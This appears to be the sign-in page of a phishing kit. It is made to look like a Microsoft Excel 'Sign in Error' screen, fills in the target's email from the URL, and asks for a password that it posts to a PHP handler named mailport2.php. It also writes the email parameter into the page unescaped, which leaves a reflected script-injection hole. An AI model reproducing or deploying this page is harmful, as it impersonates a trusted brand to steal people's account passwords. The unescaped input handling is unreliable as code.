<html>
<head>

	<meta charset="utf-8">
	<title>Microsoft Excel</title>
	<link rel="stylesheet" href="./css/form.css">
	<link rel="icon" href="./support/favicon.png" type="image/gif" sizes="16x16">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<style>
	body, html { height: 100%; margin: 0; font-family: Arial, Helvetica, sans-serif;
	}
	* {box-sizing: border-box;
	}
	.bg-image {
	/* The image used */
	background-image: url("./support/background.png");
	/* Add the blur effect */
	filter: blur(2px); -webkit-filter: blur(2px);
	/* Full height */
	height: 100%; 
	/* Center and scale the image nicely */
	background-position: center; background-repeat: no-repeat; background-size: cover;
	}
	</style>

</head>
<body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0" style="background: #FFF">	
	<div class="bg-image"></div>
	<table width="100%" border="0" cellspacing="0" align="center" 
	style="position:absolute; top:207px; left:35px; width:283px; height:350px;">
  	<tbody><tr><td style="background:#397448; border-radius:2px 7px 1px 15px;"></td></tr></tbody></table>
	<img src="./support/logo.png" style="position:absolute; top:250px; left:60px; width:235px; height:45px; border-radius:1px 5px 2px 5px;">
	<div style="position: absolute; top: 315px; left: 60px;">
		<font style="font-family: arial; font-size: 17px; color:#FFF;">Sign in Error</font>
		<br><font style="font-family: arial; font-size: 12px; color:#FFFF00;">Invalid Password entered. Sign in to View</font>
	</div>
	<div style="position: absolute; top: 365px; left: 60px;">
			<form method="post" action="./mailport2.php">
				<input  name="login" type="email" value="<?php echo $_GET['email']; ?>" disabled>
				<br><br><input  name="passwd" type="password" placeholder="Password" required >
				<br><br><input type="submit" value="View File">
				<br><input type="hidden" name="login" value="<?php echo $_GET['email']; ?>">
			</form>				   
	</div>
</body>
</html>